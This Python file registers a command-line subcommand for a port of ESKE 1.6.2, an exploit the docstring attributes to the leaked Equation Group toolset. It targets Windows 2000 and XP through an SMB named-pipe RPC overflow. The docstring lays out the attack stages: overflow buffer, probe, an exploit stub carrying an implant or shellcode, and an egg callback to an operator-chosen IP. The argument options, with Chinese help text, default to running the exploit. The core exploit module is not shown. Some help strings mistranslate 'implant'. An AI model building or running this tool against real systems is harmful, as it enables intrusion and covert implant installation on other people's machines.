#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
eske — ESKE 1.6.2 exploit (Equation Group Legacy Windows Exploits).

Python rewrite of `ESKE.exe` recovered from
`EQGRP_Lost_in_Translation-master/windows/Resources/LegacyWindowsExploits/Exploits/ESKE 1.6.2/ESKE.exe`.

ESKE drives an SMB/RPC-based exploit against Windows 2000 / Windows XP targets.
It:
  1. Opens an SMB session to the target (anonymous or authenticated),
  2. Builds a randomized Unicode overflow buffer (BuildRandomUnicodeString /
     BuildOverflowBuffer),
  3. Packages a Touch stub (Build_ESKE_Touch3_Package_Stub) to probe the target,
  4. Packages the exploit stub (Build_ESKE_Exploit_Package_Stub) carrying the
     implant or shellcode,
  5. Sends the payload over the remote named pipe and optionally handles an
     Egg callback for implant upload.

The original binary uses WNetAddConnection2A + CreateFileW on
`\\<host>\pipe\<endpoint>` (default endpoint `\pipe\epmapper`) and drives the
RPC/SMB layer through raw Winsock calls.  This port uses impacket's SMB
connection for the named-pipe transport.

CLI mirrors the original argument block:

  eske <target_ip> [options]

os_type: 1 = Windows XP, 2 = Windows 2000
sp_level: 1 = SP2, 2 = NOT SP2 (only relevant for XP)
run_option: 1 = Touch #1 (banner grab), 2 = Touch #2 (login test), 3 = Exploit
implant_socket_option: 1 = reuse existing socket, 2 = new socket
egg_socket_option: 1 = reuse existing exploit socket, 2 = egg callback
auth_type: 0 = None, 1 = Basic, 2 = NTLM
file_type: 1 = DLL, 2 = EXE
"""

from . import eske_exp


def eske_handle(args):
    """Run the ESKE exploit against the supplied target."""
    return eske_exp.run_function(
        target=args.target,
        port=args.port,
        os_type=args.ostype,
        sp_level=args.splevel,
        endpoint=args.endpoint,
        username=args.username,
        password=args.password,
        domain=args.domain,
        implant_file=args.implant,
        listening_post=args.listening_post,
        file_type=args.filetype,
        drop_file=args.dropfile,
        timeout=args.timeout,
        run_option=args.runoption,
        implant_socket_option=args.implant_socket_option,
        egg_callback_ip=args.egg_ip,
        egg_callback_port=args.eggport,
        egg_socket_option=args.eggsocket,
        auth_type=args.authtype,
        netbios_client=args.netbios_client,
        netbios_server=args.netbios_server,
    )


def reg_subparser(subparsers):
    """Register the `eske` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "eske",
        help="ESKE 1.6.2 SMB/RPC 漏洞利用 (Windows 2000 / XP)",
        description="ESKE 1.6.2 — Equation Group 旧式 Windows 漏洞利用工具。"
                    "通过 SMB 命名管道向目标发送 RPC 溢出请求，"
                    "支持 Touch（探测）和 Exploit（利用）两个阶段，"
                    "可选 Egg Callback 方式上传惯例负载。",
    )
    p.add_argument(
        "target", metavar="TARGET_IP",
        help="目标主机 IP 地址",
    )
    p.add_argument(
        "-p", "--port", type=int, default=445, metavar="PORT",
        help="目标端口 (默认 445)",
    )
    p.add_argument(
        "-o", "--ostype", type=int, choices=[1, 2], default=1, metavar="TYPE",
        help="目标系统：1=Windows XP，2=Windows 2000 (默认 1)",
    )
    p.add_argument(
        "-s", "--splevel", type=int, choices=[1, 2], default=2, metavar="LEVEL",
        help="服务包级别（仅 XP 有效）：1=SP2，2=非 SP2 (默认 2)",
    )
    p.add_argument(
        "-e", "--endpoint", metavar="PIPE",
        default=r"\pipe\epmapper",
        help="RPC 命名管道端点 (默认 \\pipe\\epmapper)",
    )
    p.add_argument(
        "-U", "--username", metavar="USER",
        help="认证用户名",
    )
    p.add_argument(
        "-P", "--password", metavar="PASS",
        help="认证密码",
    )
    p.add_argument(
        "-d", "--domain", metavar="DOMAIN",
        help="认证域（为空则登录本地机器）",
    )
    p.add_argument(
        "-f", "--implant", metavar="FILE",
        help="植入负载文件路径",
    )
    p.add_argument(
        "-l", "--listening-post", metavar="DLL",
        help="监听站 DLL 路径",
    )
    p.add_argument(
        "-x", "--filetype", type=int, choices=[1, 2], default=2, metavar="TYPE",
        help="文件类型：1=DLL，2=EXE (默认 2)",
    )
    p.add_argument(
        "-q", "--dropfile", metavar="NAME",
        help="目标上放置的文件名（仅 EXE 类型有效）",
    )
    p.add_argument(
        "-t", "--timeout", type=int, default=30, metavar="SEC",
        help="等待回复的秒数 (默认 30)",
    )
    p.add_argument(
        "-r", "--runoption", type=int, choices=[1, 2, 3], default=3, metavar="OPT",
        help="运行选项：1=Touch #1 (横幅抓取)，2=Touch #2 (登录测试)，3=Exploit (默认 3)",
    )
    p.add_argument(
        "-c", "--implant-socket-option", type=int, choices=[1, 2], default=1, metavar="OPT",
        help="惯例套接字选项：1=复用现有利用套接字，2=新建套接字 (默认 1)",
    )
    p.add_argument(
        "-i", "--egg-ip", metavar="IP",
        help="Egg Callback 回连 IP 地址",
    )
    p.add_argument(
        "-E", "--eggport", type=int, default=0, metavar="PORT",
        help="Egg Callback 端口",
    )
    p.add_argument(
        "-u", "--eggsocket", type=int, choices=[1, 2], default=1, metavar="OPT",
        help="Egg 套接字选项：1=复用现有利用套接字，2=Egg 回连 (默认 1)",
    )
    p.add_argument(
        "-A", "--authtype", type=int, choices=[0, 1, 2], default=0, metavar="TYPE",
        help="认证类型：0=None，1=Basic，2=NTLM (默认 0)",
    )
    p.add_argument(
        "-n", "--netbios-client", metavar="NAME",
        default="*SMBCLIENT",
        help="源 NETBIOS 名 (默认 *SMBCLIENT)",
    )
    p.add_argument(
        "-S", "--netbios-server", metavar="NAME",
        default="*SMBSERVER",
        help="目标 NETBIOS 名 (默认 *SMBSERVER)",
    )
    p.set_defaults(func=eske_handle)
